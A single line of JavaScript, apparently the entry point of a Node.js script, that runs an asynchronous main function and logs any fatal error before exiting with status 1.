main().catch(e => { console.error('FATAL:', e); process.exit(1); });
